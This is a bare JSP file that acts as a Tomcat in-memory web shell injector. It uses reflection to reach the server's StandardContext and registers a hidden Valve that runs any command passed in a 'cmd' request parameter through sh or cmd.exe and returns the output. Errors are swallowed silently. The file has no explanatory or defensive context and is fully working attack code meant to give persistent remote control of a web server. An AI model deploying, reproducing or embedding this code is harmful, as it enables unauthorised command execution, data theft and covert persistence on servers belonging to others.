<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    try {
        ServletContext servletContext = request.getSession().getServletContext();
        Field appctx = servletContext.getClass().getDeclaredField("context");
        appctx.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
        Field stdctx = applicationContext.getClass().getDeclaredField("context");
        stdctx.setAccessible(true);
        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

        ValveBase valve = new ValveBase() {
            @Override
            public void invoke(Request request, Response response){
                try{
                    String cmd = request.getParameter("cmd");
                    if(cmd != null){
                        boolean isLinux = true;
                        String osTyp = System.getProperty("os.name");
                        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                            isLinux = false;
                        }
                        String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                        Scanner s = new Scanner(in).useDelimiter("\\a");
                        String output = s.hasNext() ? s.next() : "";
                        PrintWriter out = response.getWriter();
                        out.println(output);
                        out.flush();
                        out.close();
                    }
                    this.getNext().invoke(request, response);
                }catch(Exception e){
                }

            }
        };
        standardContext.getPipeline().addValve(valve);
        response.getWriter().write("Success");
    } catch (Exception e) {
        e.printStackTrace();
    }
%>